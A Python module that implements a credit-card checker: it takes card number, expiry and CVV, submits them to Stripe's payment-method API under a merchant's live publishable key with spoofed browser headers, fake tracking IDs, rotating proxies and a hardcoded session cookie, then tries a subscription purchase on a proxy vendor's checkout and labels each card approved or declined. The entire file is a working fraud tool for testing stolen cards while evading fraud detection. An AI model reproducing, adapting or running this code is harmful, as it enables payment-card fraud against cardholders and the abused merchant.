import time
import random
import uuid
import requests
from utils.proxy import get_proxy, mark_proxy_failed
from utils.helpers import random_hex

async def stripe_check(card, month, year, cvv):
    try:
        session = requests.Session()
        session.cookies.set('__Secure-better-auth.session_token', 'IGplOCY9C9nv0LbgIe1u9LHLBRRz8MYe.WIu%2ByMsXOkJstA%2BsXq7VPWEeRM%2FJDPfJefS7DxhDH54%3D')
        session.cookies.set('__stripe_mid', '6634fc9c-5c39-4a2c-a3bb-ea6dfe12233a57ff68')
        session.cookies.set('ref_gclid', 'EAIaIQobChMI77n0z-CTlQMVPkKRBR29VzsWEAAYASAAEgIKJPD_BwE')
        session.cookies.set('ref_url', 'https://www.google.com/')
        session.cookies.set('_gid', f"GA1.2.{random.randint(100000000,999999999)}.{int(time.time())}")
        session.cookies.set('_ga', f"GA1.2.{random.randint(100000000,999999999)}.{int(time.time())}")
        session.cookies.set('testcookie', '1')
        session.cookies.set('__stripe_sid', f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}{random_hex(8)}")
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-SS,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        })
        proxy = get_proxy()
        if proxy:
            session.proxies.update(proxy)
        formatted = f"{card[:4]} {card[4:8]} {card[8:12]} {card[12:]}"
        data = {
            'type': 'card',
            'card[number]': formatted,
            'card[cvc]': cvv,
            'card[exp_year]': year,
            'card[exp_month]': month,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '99501',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js%2Fe96dd26916%3B+stripe-js-v3%2Fe96dd26916%3B+payment-element',
            'referrer': 'https://instantproxies.com',
            'time_on_page': str(random.randint(1000,99999)),
            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'standard',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_id]': f"elements_session_{random_hex(10)}",
            'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}{random_hex(6)}",
            'muid': '6634fc9c-5c39-4a2c-a3bb-ea6dfe12233a57ff68',
            'sid': f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}{random_hex(8)}",
            'key': 'pk_live_51JNqHcDqkIL4eWbXsNhdA3tWu4k4MYDHJeWjBJRrEIaljus0goMwf1oZQdki3LZqPwjBEqzDojGQ66vAMPFGIeLa008mBfHVrq',
            '_stripe_version': '2025-03-31.basil',
            'radar_options[hcaptcha_token]': f"P1_{random_hex(100)}"
        }
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
        }
        resp = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        if resp.status_code != 200:
            if proxy: mark_proxy_failed(proxy)
            return ("❌ ERROR", f"Stripe PM error: {resp.status_code}", None)
        pm_data = resp.json()
        pm_id = pm_data.get('id')
        if not pm_id:
            return ("❌ ERROR", "No PM ID", None)
        intent_headers = {
            'authority': 'instantproxies.com',
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://instantproxies.com',
            'referer': 'https://instantproxies.com/dashboard/checkout?plan=DC_1',
        }
        payload = {
            "productId": "price_DATACENTER_BASE_PLAN",
            "paymentMethodId": pm_id,
            "quantity": 1,
            "proxyType": "datacenter"
        }
        intent_resp = session.post('https://instantproxies.com/api/payments/create-subscription-intent', headers=intent_headers, json=payload, timeout=30)
        if intent_resp.status_code == 200:
            sub_data = intent_resp.json()
            if sub_data.get('subscriptionId'):
                return ("✅ APPROVED", f"Subscription ID: {sub_data['subscriptionId']}", True)
            else:
                return ("❌ DECLINED", "Subscription failed", False)
        else:
            if proxy: mark_proxy_failed(proxy)
            return ("❌ ERROR", f"Stripe sub error: {intent_resp.status_code}", None)
    except Exception as e:
        return ("❌ ERROR", str(e)[:100], None)